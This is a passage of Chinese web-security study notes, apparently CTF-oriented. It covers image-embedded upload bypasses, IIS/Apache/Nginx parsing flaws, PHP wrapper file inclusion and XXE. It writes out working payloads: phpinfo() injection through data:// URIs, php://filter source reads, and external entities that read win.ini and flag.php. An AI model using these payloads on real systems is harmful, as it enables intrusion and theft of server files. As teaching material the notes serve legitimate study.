style=\"color: #89DDFF\">,</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">           </span><span style=\"color: #F78C6C\">0x22</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0xf6</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0xd9</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x43</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x5d</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0xfb</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0xae</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0xcc</span><span style=\"color: #89DDFF\">,</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">           </span><span style=\"color: #F78C6C\">0x5a</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x01</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0xdc</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x5a</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x01</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0xdc</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0xa3</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x9f</span><span style=\"color: #89DDFF\">,</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">           </span><span style=\"color: #F78C6C\">0x67</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0xa5</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0xbe</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x5f</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x76</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x74</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x5a</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x4c</span><span style=\"color: #89DDFF\">,</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">           </span><span style=\"color: #F78C6C\">0xa1</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x3f</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x7a</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0xbf</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x30</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x6b</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x88</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x2d</span><span style=\"color: #89DDFF\">,</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">           </span><span style=\"color: #F78C6C\">0x60</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x65</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x7d</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x52</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x9d</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0xad</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x88</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0xa1</span><span style=\"color: #89DDFF\">,</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">           </span><span style=\"color: #F78C6C\">0x66</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x44</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x50</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x33</span><span style=\"color: #89DDFF\">);</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\"> </span></span>\n<span class=\"line\"><span style=\"color: #BABED8\"> </span></span>\n<span class=\"line\"><span style=\"color: #BABED8\"> </span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">$</span><span style=\"color: #BABED8\">img </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">imagecreatetruecolor</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #F78C6C\">32</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">32</span><span style=\"color: #89DDFF\">);</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\"> </span></span>\n<span class=\"line\"><span style=\"color: #89DDFF; font-style: italic\">for</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">($</span><span style=\"color: #BABED8\">y </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0</span><span style=\"color: #89DDFF\">;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">$</span><span style=\"color: #BABED8\">y </span><span style=\"color: #89DDFF\">&lt;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">sizeof</span><span style=\"color: #89DDFF\">($</span><span style=\"color: #BABED8\">p</span><span style=\"color: #89DDFF\">);</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">$</span><span style=\"color: #BABED8\">y </span><span style=\"color: #89DDFF\">+=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">3</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">   </span><span style=\"color: #89DDFF\">$</span><span style=\"color: #BABED8\">r </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">$</span><span style=\"color: #BABED8\">p</span><span style=\"color: #89DDFF\">[$</span><span style=\"color: #BABED8\">y</span><span style=\"color: #89DDFF\">];</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">   </span><span style=\"color: #89DDFF\">$</span><span style=\"color: #BABED8\">g </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">$</span><span style=\"color: #BABED8\">p</span><span style=\"color: #89DDFF\">[$</span><span style=\"color: #BABED8\">y</span><span style=\"color: #89DDFF\">+</span><span style=\"color: #F78C6C\">1</span><span style=\"color: #89DDFF\">];</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">   </span><span style=\"color: #89DDFF\">$</span><span style=\"color: #BABED8\">b </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">$</span><span style=\"color: #BABED8\">p</span><span style=\"color: #89DDFF\">[$</span><span style=\"color: #BABED8\">y</span><span style=\"color: #89DDFF\">+</span><span style=\"color: #F78C6C\">2</span><span style=\"color: #89DDFF\">];</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">   </span><span style=\"color: #89DDFF\">$</span><span style=\"color: #BABED8\">color </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">imagecolorallocate</span><span style=\"color: #89DDFF\">($</span><span style=\"color: #BABED8\">img</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">$</span><span style=\"color: #BABED8\">r</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">$</span><span style=\"color: #BABED8\">g</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">$</span><span style=\"color: #BABED8\">b</span><span style=\"color: #89DDFF\">);</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">   </span><span style=\"color: #82AAFF\">imagesetpixel</span><span style=\"color: #89DDFF\">($</span><span style=\"color: #BABED8\">img</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">round</span><span style=\"color: #89DDFF\">($</span><span style=\"color: #BABED8\">y </span><span style=\"color: #89DDFF\">/</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">3</span><span style=\"color: #89DDFF\">),</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">$</span><span style=\"color: #BABED8\">color</span><span style=\"color: #89DDFF\">);</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">&#125;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\"> </span></span>\n<span class=\"line\"><span style=\"color: #82AAFF\">imagepng</span><span style=\"color: #89DDFF\">($</span><span style=\"color: #BABED8\">img</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">./1.png</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">);</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">?&gt;</span></span></code></pre></div></li>\n</ul>\n<h3 id=\"中间件解析漏洞\"><a href=\"#中间件解析漏洞\" class=\"headerlink\" title=\"中间件解析漏洞\"></a>中间件解析漏洞</h3><p><a href=\"https://blog.csdn.net/m0_64378913/article/details/125067293\">中间件文件解析漏洞概述及实例——Apache、IIS和Nginx_中间件解析漏洞-CSDN博客</a></p>\n<h4 id=\"IIS-5-x-6-x\"><a href=\"#IIS-5-x-6-x\" class=\"headerlink\" title=\"IIS 5.x-6.x\"></a>IIS 5.x-6.x</h4><ul>\n<li>文件解析: iis6.0下，<strong>分号后面的不被解析</strong>, <code>xx.asp;.jpg</code>被解析为asp</li>\n<li>目录解析: 名字为<code>.asp</code>、<code>.asa</code>的<strong>文件夹</strong>, 其下任何扩展名的文件都被IIS当做<strong>asp文件</strong>来解析并执行</li>\n</ul>\n<h4 id=\"IIS7-5\"><a href=\"#IIS7-5\" class=\"headerlink\" title=\"IIS7.5\"></a>IIS7.5</h4><ul>\n<li>与nginx的类似</li>\n</ul>\n<h4 id=\"apache\"><a href=\"#apache\" class=\"headerlink\" title=\"apache\"></a>apache</h4><h5 id=\"换行解析\"><a href=\"#换行解析\" class=\"headerlink\" title=\"换行解析\"></a>换行解析</h5><ul>\n<li><p>利用前提: 黑名单验证(不能上传php jsp等) version: 2.4.0~2.4.29</p>\n</li>\n<li><p>在解析PHP时，<code>1.php%0A</code>将被按照PHP后缀进行解析(%0a为换行)</p>\n</li>\n</ul>\n<h5 id=\"多后缀解析\"><a href=\"#多后缀解析\" class=\"headerlink\" title=\"多后缀解析\"></a>多后缀解析</h5><ul>\n<li><p>Apache HTTPD 支持一个文件拥有多个后缀，并为不同后缀执行不同的指令</p>\n</li>\n<li><p>如果添加了如下配置, <code>1.php.png</code>可以当成php解析</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">AddHandler application/x-httpd-php .php</span></span></code></pre></div></li>\n</ul>\n<h4 id=\"Nginx\"><a href=\"#Nginx\" class=\"headerlink\" title=\"Nginx\"></a>Nginx</h4><h5 id=\"文件名逻辑漏洞\"><a href=\"#文件名逻辑漏洞\" class=\"headerlink\" title=\"文件名逻辑漏洞\"></a>文件名逻辑漏洞</h5><ul>\n<li><code>1.gif[0x20][0x00].php</code>Nginx却错误地认为请求的文件是<code>1.gif[0x20]</code></li>\n</ul>\n<h5 id=\"解析漏洞\"><a href=\"#解析漏洞\" class=\"headerlink\" title=\"解析漏洞\"></a>解析漏洞</h5><ul>\n<li>用户配置不当造成漏洞</li>\n<li><code>http://ip/1.png</code>访问图片, <code>http://ip/1.png/.php</code>解析图片为php</li>\n</ul>\n<h3 id=\"编辑器漏洞\"><a href=\"#编辑器漏洞\" class=\"headerlink\" title=\"编辑器漏洞\"></a>编辑器漏洞</h3><ul>\n<li><a href=\"https://blog.csdn.net/weixin_45329947/article/details/122712440\">Ueditor、FCKeditor、Kindeditor编辑器漏洞_kindeditor漏洞-CSDN博客</a></li>\n</ul>\n<h2 id=\"文件包含\"><a href=\"#文件包含\" class=\"headerlink\" title=\"文件包含\"></a>文件包含</h2><h3 id=\"思路要点\"><a href=\"#思路要点\" class=\"headerlink\" title=\"思路要点\"></a>思路要点</h3><h4 id=\"黑盒-1\"><a href=\"#黑盒-1\" class=\"headerlink\" title=\"黑盒\"></a>黑盒</h4><ul>\n<li>主要观察<strong>参数传递</strong>的数据和文件名是否对应</li>\n</ul>\n<h4 id=\"白盒-1\"><a href=\"#白盒-1\" class=\"headerlink\" title=\"白盒\"></a>白盒</h4><ol>\n<li>可通过应用功能追踪代码定位审计</li>\n<li>可通过却本特定函数搜索定位审计</li>\n<li>可通过<strong>伪协议</strong>玩法绕过相关修复等</li>\n</ol>\n<h3 id=\"php伪协议\"><a href=\"#php伪协议\" class=\"headerlink\" title=\"php伪协议\"></a>php伪协议</h3><p><a href=\"https://segmentfault.com/a/1190000018991087\">PHP伪协议总结 - 个人文章 - SegmentFault 思否</a></p>\n<h4 id=\"file-协议\"><a href=\"#file-协议\" class=\"headerlink\" title=\"file 协议\"></a>file 协议</h4><h5 id=\"条件-1\"><a href=\"#条件-1\" class=\"headerlink\" title=\"条件\"></a>条件</h5><ul>\n<li><code>allow_url_fopen</code>:off&#x2F;on</li>\n<li><code>allow_url_include</code> :off&#x2F;on</li>\n</ul>\n<h5 id=\"示例-1\"><a href=\"#示例-1\" class=\"headerlink\" title=\"示例\"></a>示例</h5><ul>\n<li><div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">?file=file://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.txt</span></span></code></pre></div></li>\n<li><div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">?file=./phpinfo.txt</span></span></code></pre></div></li>\n</ul>\n<h4 id=\"php-协议\"><a href=\"#php-协议\" class=\"headerlink\" title=\"php 协议\"></a>php 协议</h4><p><strong>条件</strong></p>\n<ul>\n<li><code>allow_url_fopen</code>:off&#x2F;on</li>\n<li><code>allow_url_include</code> :仅<code>php://input php://stdin php://memory php://temp </code>需要on</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>协议</th>\n<th>作用</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><strong>php:&#x2F;&#x2F;input</strong></td>\n<td>可以访问请求的原始数据的只读流，在POST请求中访问POST的<code>data</code>部分，在<code>enctype=&quot;multipart/form-data&quot;</code> 的时候<code>php://input </code>是无效的。</td>\n</tr>\n<tr>\n<td>php:&#x2F;&#x2F;output</td>\n<td>只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。</td>\n</tr>\n<tr>\n<td>php:&#x2F;&#x2F;fd</td>\n<td>(&gt;&#x3D;5.3.6)允许直接访问指定的文件描述符。例如 <code>php://fd/3</code> 引用了文件描述符 3。</td>\n</tr>\n<tr>\n<td>php:&#x2F;&#x2F;memory php:&#x2F;&#x2F;temp</td>\n<td>(&gt;&#x3D;5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 <code>php://memory</code> 总是把数据储存在内存中，而 <code>php://temp</code> 会在内存量达到预定义的限制后（默认是 <code>2MB</code>）存入临时文件中。临时文件位置的决定和 <code>sys_get_temp_dir()</code> 的方式一致。</td>\n</tr>\n<tr>\n<td><strong>php:&#x2F;&#x2F;filter</strong></td>\n<td>(&gt;&#x3D;5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式<code>（all-in-one）</code>的文件函数非常有用，类似 <code>readfile()</code>、<code>file()</code> 和 <code>file_get_contents()</code>，在数据流内容读取之前没有机会应用其他过滤器。</td>\n</tr>\n</tbody></table>\n<h5 id=\"php-filter参数详解\"><a href=\"#php-filter参数详解\" class=\"headerlink\" title=\"php://filter参数详解\"></a><code>php://filter</code>参数详解</h5><table>\n<thead>\n<tr>\n<th>php:&#x2F;&#x2F;filter 参数</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>resource&#x3D;&lt;要过滤的数据流&gt;</td>\n<td>必须项。它指定了你要筛选过滤的数据流。</td>\n</tr>\n<tr>\n<td>read&#x3D;&lt;读链的过滤器&gt;</td>\n<td>可选项。可以设定一个或多个过滤器名称，以管道符（<em>\\ </em>）分隔。</td>\n</tr>\n<tr>\n<td>write&#x3D;&lt;写链的过滤器&gt;</td>\n<td>可选项。可以设定一个或多个过滤器名称，以管道符（\\）分隔。</td>\n</tr>\n<tr>\n<td>&lt;; 两个链的过滤器&gt;</td>\n<td>任何没有以 <em>read&#x3D;</em> 或 <em>write&#x3D;</em> 作前缀的筛选器列表会视情况应用于读或写链。</td>\n</tr>\n</tbody></table>\n<p>示例:</p>\n<p><code>php://filter/read=convert.base64-encode/resource=[文件名]</code>读取文件源码（针对php文件需要base64编码）</p>\n<h4 id=\"data-协议\"><a href=\"#data-协议\" class=\"headerlink\" title=\"data 协议\"></a>data 协议</h4><h5 id=\"条件-2\"><a href=\"#条件-2\" class=\"headerlink\" title=\"条件\"></a>条件</h5><ul>\n<li><code>allow_url_fopen</code>:on</li>\n<li><code>allow_url_include</code> :on</li>\n</ul>\n<h5 id=\"示例-2\"><a href=\"#示例-2\" class=\"headerlink\" title=\"示例\"></a>示例</h5><ul>\n<li><div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</span></span></code></pre></div></li>\n<li><div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span></span></code></pre></div></li>\n</ul>\n<h4 id=\"http-https-协议\"><a href=\"#http-https-协议\" class=\"headerlink\" title=\"http &amp; https 协议\"></a>http &amp; https 协议</h4><h5 id=\"条件-3\"><a href=\"#条件-3\" class=\"headerlink\" title=\"条件\"></a>条件</h5><ul>\n<li><code>allow_url_fopen</code>:on</li>\n<li><code>allow_url_include</code> :on</li>\n</ul>\n<h5 id=\"作用\"><a href=\"#作用\" class=\"headerlink\" title=\"作用\"></a>作用</h5><ul>\n<li>通常用于远程包含</li>\n</ul>\n<h5 id=\"示例-3\"><a href=\"#示例-3\" class=\"headerlink\" title=\"示例\"></a>示例</h5><ul>\n<li><div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">?file=http://127.0.0.1/phpinfo.txt</span></span></code></pre></div></li>\n</ul>\n<h3 id=\"LFI-本地文件包含\"><a href=\"#LFI-本地文件包含\" class=\"headerlink\" title=\"LFI 本地文件包含\"></a>LFI 本地文件包含</h3><ul>\n<li>通过文件上传</li>\n<li>借助日志(UA头), session写入</li>\n<li>伪协议+编码解码</li>\n</ul>\n<h2 id=\"XXE-–-XML-External-Entity-Injection\"><a href=\"#XXE-–-XML-External-Entity-Injection\" class=\"headerlink\" title=\"XXE – XML External Entity Injection\"></a>XXE – XML External Entity Injection</h2><p><a href=\"https://www.cnblogs.com/20175211lyz/p/11413335.html\">CTF XXE - MustaphaMond - 博客园 (cnblogs.com)</a></p>\n<ul>\n<li>全称为XML外部实体注入，由于程序在解析输入的XML数据时，解析了攻击者伪造的外部实体而产生的。</li>\n<li>危害: 文件读取, 端口探针等</li>\n</ul>\n<h3 id=\"XML\"><a href=\"#XML\" class=\"headerlink\" title=\"XML\"></a>XML</h3><h4 id=\"概念\"><a href=\"#概念\" class=\"headerlink\" title=\"概念\"></a>概念</h4><ul>\n<li><p><code>XML</code>即 可扩展标记语言（EXtensible Markup Language），是一种标记语言，其标签没有预定义，您需要自行定义标签，是W3C的推荐标准。其于HTML的区别是：</p>\n<ul>\n<li>HTML 被设计用来显示数据</li>\n<li>XML 被设计用来传输和存储数据</li>\n</ul>\n</li>\n<li><p>XML文档结构包括：</p>\n<ul>\n<li>XML声明</li>\n<li>DTD文档类型定义（可选）</li>\n<li>文档元素</li>\n</ul>\n</li>\n<li><p>示例:</p>\n<div class=\"language-xml\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">xml</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #676E95; font-style: italic\">&lt;!--XML声明--&gt;</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">&lt;?</span><span style=\"color: #F07178\">xml</span><span style=\"color: #C792EA\"> version</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">1.0</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C792EA\"> encoding</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">UTF-8</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">?&gt;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #676E95; font-style: italic\">&lt;!--DTD，这部分可选的--&gt;</span><span style=\"color: #BABED8\">          </span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">&lt;!</span><span style=\"color: #F78C6C\">DOCTYPE</span><span style=\"color: #89DDFF\"> </span><span style=\"color: #BABED8\">foo</span><span style=\"color: #89DDFF\"> [ </span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">    &lt;!ELEMENT foo ANY &gt;</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">    &lt;!</span><span style=\"color: #F78C6C\">ENTITY</span><span style=\"color: #89DDFF\"> </span><span style=\"color: #BABED8\">xxe</span><span style=\"color: #F78C6C\"> SYSTEM </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">file:///c:/windows/win.ini</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\"> &gt;</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">]&gt;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #676E95; font-style: italic\">&lt;!--文档元素--&gt;</span><span style=\"color: #BABED8\">                                                                          </span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">&lt;</span><span style=\"color: #F07178\">foo</span><span style=\"color: #89DDFF\">&gt;&amp;</span><span style=\"color: #BABED8\">xxe</span><span style=\"color: #89DDFF\">;&lt;/</span><span style=\"color: #F07178\">foo</span><span style=\"color: #89DDFF\">&gt;</span></span></code></pre></div></li>\n</ul>\n<h4 id=\"DTD\"><a href=\"#DTD\" class=\"headerlink\" title=\"DTD\"></a>DTD</h4><ul>\n<li><p>文档类型定义（DTD）用来为XML文档定义语义约束, 可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。</p>\n</li>\n<li><p>DTD一般认为有两种引用或声明方式：</p>\n<ul>\n<li><p>1、内部DTD：即对XML文档中的元素、属性和实体的DTD的声明都在XML文档中。</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">&lt;!DOCTYPE note [</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">    &lt;!ENTITY a &quot;admin&quot;&gt;</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">]&gt;</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">&lt;note&gt;&amp;a&lt;/note&gt;</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">&lt;!-- admin --&gt;</span></span></code></pre></div></li>\n<li><p>2、外部DTD：即对XML文档中的元素、属性和实体的DTD的声明都在一个独立的DTD文件（.dtd）中。</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">&lt;!DOCTYPE note&gt; [</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">    &lt;!ENTITY c SYSTEM &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;&gt;</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">]&gt;</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">&lt;note&gt;&amp;c&lt;/note&gt;</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">&lt;!-- Y2w0eV9uZWVkX2FfZ3JpbGZyaWVuZA== --&gt;</span></span></code></pre></div></li>\n</ul>\n</li>\n<li><p>实体声明方式:</p>\n<ul>\n<li><p>内部实体</p>\n<div class=\"language-xml\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">xml</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #89DDFF\">&lt;!</span><span style=\"color: #F78C6C\">DOCTYPE</span><span style=\"color: #89DDFF\"> </span><span style=\"color: #BABED8\">note</span><span style=\"color: #89DDFF\"> [</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">    &lt;!</span><span style=\"color: #F78C6C\">ENTITY</span><span style=\"color: #89DDFF\"> </span><span style=\"color: #BABED8\">a</span><span style=\"color: #89DDFF\"> </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">admin</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">]&gt;</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">&lt;</span><span style=\"color: #F07178\">note</span><span style=\"color: #89DDFF\">&gt;</span><span style=\"color: #BABED8\">&amp;a</span><span style=\"color: #89DDFF\">&lt;/</span><span style=\"color: #F07178\">note</span><span style=\"color: #89DDFF\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #676E95; font-style: italic\">&lt;!-- admin --&gt;</span></span></code></pre></div></li>\n<li><p>参数实体</p>\n<div class=\"language-xml\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">xml</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #89DDFF\">&lt;!</span><span style=\"color: #F78C6C\">DOCTYPE</span><span style=\"color: #89DDFF\"> </span><span style=\"color: #BABED8\">note</span><span style=\"color: #89DDFF\">&gt;</span><span style=\"color: #BABED8\"> [</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    &lt;!ENTITY % b &quot;&lt;!ENTITY b1 &quot;awsl&quot;&gt;&quot;&gt;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    %b;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">]&gt;</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">&lt;</span><span style=\"color: #F07178\">note</span><span style=\"color: #89DDFF\">&gt;</span><span style=\"color: #BABED8\">&amp;b1</span><span style=\"color: #89DDFF\">&lt;/</span><span style=\"color: #F07178\">note</span><span style=\"color: #89DDFF\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #676E95; font-style: italic\">&lt;!-- awsl --&gt;</span></span></code></pre></div><ul>\n<li>参数实体用<code>% 